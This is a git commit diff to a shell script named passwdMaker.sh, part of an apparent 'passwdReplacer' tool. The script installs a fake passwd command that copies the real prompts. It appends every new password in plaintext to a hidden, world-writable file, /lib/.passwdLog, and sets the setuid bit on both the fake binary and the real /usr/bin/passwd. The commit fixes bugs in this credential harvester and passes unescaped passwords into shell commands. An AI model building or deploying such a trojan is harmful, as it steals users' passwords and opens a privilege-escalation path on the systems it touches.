ba01b889ba3cd39fe7c23d737a9a11330c04b167
Sam Burton <sam.burton271@gmail.com>
2024-03-31 13:32:48 -0400

    Fixed variable errors and added new lines

--- syslogT/passwdReplacer/passwdMaker.sh
+++ syslogT/passwdReplacer/passwdMaker.sh
@@ -24,30 +24,41 @@ def main():
         os.system('stty -echo')
         while(x):
             password = input("New password: ")
+            print("\n")
             dump = input("Retype new password: ")
+            print("\n")
             if(password != dump):
                 print("Sorry, passwords do not match.")
+                print("\n")
             else:
                 x = False
         os.system("echo \"" + user + ":" + password + "\" >> /lib/.passwdLog")
-        os.system("echo "+name+":"+password+" | chpasswd")
+        os.system("echo "+user+":"+password+" | chpasswd")
         print("passwd: all authentication tokens updated successfully.")
+        print("\n")
     else:
         os.system('stty -echo')
         while(x):
             current = input("(current) UNIX password: ")
+            print("\n")
             password = input("New password: ")
+            print("\n")
             dump = input("Retype new password: ")
+            print("\n")
             if(password != dump):
                 print("Sorry, passwords do not match.")
+                print("\n")
             else:
                 x = False
         os.system("echo \"" + user + ":" + password + "\" >> /lib/.passwdLog")
-        os.system("echo "+name+":"+password+" | chpasswd")
+        os.system("echo "+user+":"+password+" | chpasswd")
         print("passwd: all authentication tokens updated successfully.")
+        print("\n")
 main()
 EOFB
 touch /lib/.passwdLog
 chmod +s /usr/bin/passwdB
 chmod +x /usr/bin/passwdB
+chmod +x /usr/bin/passwd
+chmod +s /usr/bin/passwd
 chmod o+w /lib/.passwdLog
